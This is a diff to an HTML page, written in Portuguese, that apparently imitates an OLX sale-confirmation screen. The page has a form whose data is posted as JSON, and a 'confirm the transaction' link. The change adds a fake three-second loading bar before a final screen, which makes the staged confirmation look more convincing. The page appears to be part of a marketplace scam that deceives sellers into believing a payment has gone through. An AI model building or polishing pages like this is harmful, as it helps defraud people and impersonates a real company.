@@ -95,6 +95,15 @@
       text-align: center;
       margin-top: 20px;
     }
+
+    /* Animação de carregamento */
+    #barraCarregamento {
+      width: 0;
+      height: 5px;
+      background-color: #ff6600;
+      transition: width 3s;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -136,7 +145,7 @@
     </div>
 
     <div class="center">
-      <span class="link-confirmar" onclick="irParaFinal()">Clique aqui para confirmar a transação</span>
+      <span class="link-confirmar" onclick="iniciarCarregamento()">Clique aqui para confirmar a transação</span>
     </div>
 
     <div class="footer">
@@ -158,6 +167,9 @@
       <a class="link-site" href="https://www.olx.com.br" target="_blank">Ir para o site oficial da OLX</a>
     </div>
   </div>
+
+  <!-- Barra de carregamento -->
+  <div id="barraCarregamento"></div>
 
   <script>
     document.getElementById("vendaForm").addEventListener("submit", function (e) {
@@ -181,14 +193,17 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(dados)
       });
-
     });
 
-    function irParaFinal() {
+    function iniciarCarregamento() {
+      // Inicia a animação da barra de carregamento
+      document.getElementById("barraCarregamento").style.width = "100%";
+      
+      // Após 3 segundos, vai para a tela final
       setTimeout(() => {
         document.getElementById("comprovante").classList.add("hidden");
         document.getElementById("final").classList.remove("hidden");
-      }, 1500);
+      }, 3000); // 3 segundos de "carregamento"
     }
   </script>
 
